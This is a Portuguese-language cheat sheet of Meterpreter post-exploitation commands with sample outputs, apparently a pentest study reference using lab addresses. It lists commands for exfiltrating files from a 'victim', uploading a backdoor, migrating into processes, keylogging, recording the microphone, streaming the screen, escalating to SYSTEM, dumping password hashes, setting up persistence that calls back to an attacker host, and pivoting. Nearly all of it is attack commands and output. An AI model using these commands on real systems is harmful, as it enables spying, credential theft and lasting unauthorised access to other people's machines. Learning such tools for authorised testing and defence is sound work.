# Principais Comandos do Meterpreter
Uma das ferramentas mais usadas em **pós-exploração**. Ele fornece um **shell interativo** com vários módulos para controle da máquina comprometida.

## 🔹 1. **Informações do Sistema**

Usados para coletar dados básicos da máquina alvo.

* `sysinfo` → mostra informações do sistema.

  ```
  meterpreter > sysinfo
  Computer        : VICTIM-PC
  OS              : Windows 10 (Build 19041).
  Architecture    : x64
  ```
* `getuid` → exibe o usuário atual.

  ```
  meterpreter > getuid
  Server username: VICTIM-PC\user
  ```
* `ipconfig` → mostra interfaces e IPs.

  ```
  meterpreter > ipconfig
  Interface 1: Ethernet0
  IP Address : 192.168.56.102
  ```

## 🔹 2. **Navegação no Sistema de Arquivos**

Manipulação de arquivos e diretórios.

* `pwd` → mostra diretório atual.

  ```
  meterpreter > pwd
  C:\Users\user\Desktop
  ```
* `ls` ou `dir`→ lista arquivos do diretório.

  ```
  meterpreter > ls
  100644  1234  file.txt
  ```
* `cd <dir>` → muda de diretório.

  ```
  meterpreter > cd C:\\Windows
  ```
* `download <arquivo>` → baixa arquivo da vítima.

  ```
  meterpreter > download secret.docx
  ```
* `upload <arquivo>` → envia arquivo para a vítima.

  ```
  meterpreter > upload backdoor.exe
  ```

## 🔹 3. **Gerenciamento de Processos**

Controle e manipulação de processos.

* `ps` → lista processos ativos.

  ```
  meterpreter > ps
  PID   Name
  456   explorer.exe
  789   notepad.exe
  ```
* `migrate <PID>` → migra a sessão para outro processo.

  ```
  meterpreter > migrate 456
  ```
* `kill <PID>` → encerra processo.

  ```
  meterpreter > kill 789
  ```

## 🔹 4. **Captura de Dados**

Ferramentas de espionagem pós-exploração.

* `screenshot` → tira captura de tela.

  ```
  meterpreter > screenshot
  Screenshot saved to /root/screens/xxxx.png
  ```
* `record_mic` → grava áudio do microfone.

  ```
  meterpreter > record_mic 10
  ```
* `keyscan_start` → inicia keylogger.

  ```
  meterpreter > keyscan_start
  ```
* `keyscan_dump` → mostra teclas capturadas.

  ```
  meterpreter > keyscan_dump
  keystrokes: password123
  ```
* `keyscan_stop` → encerra keylogger.

  ```
  meterpreter > keyscan_stop
  ```

* `screenshare` → transmite em tempo real a tela da máquina vítima
  ```
  meterpreter > screenshare
  Starting...
  [*] Launching a browser to view the screen...
  [*] Preparing to stream video from the target...
  ```
  **_Observação:_** *pode gerar tráfego de rede alto (detectável em monitoramento).*

## 🔹 5. **Privilégios e Persistência**

Para aumentar ou manter acesso.

* `getprivs` → mostra privilégios disponíveis.
* `getsystem` → tenta escalar privilégios para SYSTEM.

  ```
  meterpreter > getsystem
  Got system via technique 1 (Named Pipe Impersonation)
  ```
* `hashdump` → extrai hashes das senhas do Windows.

  ```
  meterpreter > hashdump
  Administrator:500:...
  ```
* `run persistence` → cria persistência no alvo.

  ```
  meterpreter > run persistence -X -i 30 -p 4444 -r 192.168.56.101
  ```

## 🔹 6. **Rede**

Exploração e pivoting.

* `arp` → mostra cache ARP da vítima.
* `route` → lista rotas.
* `portfwd add` → cria redirecionamento de porta.

  ```
  meterpreter > portfwd add -l 8080 -p 80 -r 192.168.56.103
  ```
* `ipconfig` → mostra interfaces de rede.

* `netstat` → em algumas versões do Meterpreter já existe um comando integrado que lista conexões.
  ```
  meterpreter > netstat
  Proto  Local Address   Foreign Address   State
  TCP    192.168.56.102:4444   192.168.56.101:12345   ESTABLISHED
  ```

## 🔹 7. **Shell e Execução de Comandos**

Para interagir diretamente com o sistema.

* `shell` → abre um shell do SO (cmd ou bash).

  ```
  meterpreter > shell
  C:\Windows\system32> whoami
  ```
* `execute -f <programa>` → executa um programa no alvo.

  ```
  meterpreter > execute -f calc.exe
  ```

## 🔹 8. **Gerenciamento de Sessão**

Controle da própria sessão do Meterpreter.

* `sessions` → lista sessões abertas.

  ```
  meterpreter > sessions
  1   Meterpreter  192.168.56.102 -> 192.168.56.101
  ```
* `background` → coloca sessão em segundo plano.
* `exit` → fecha a sessão.
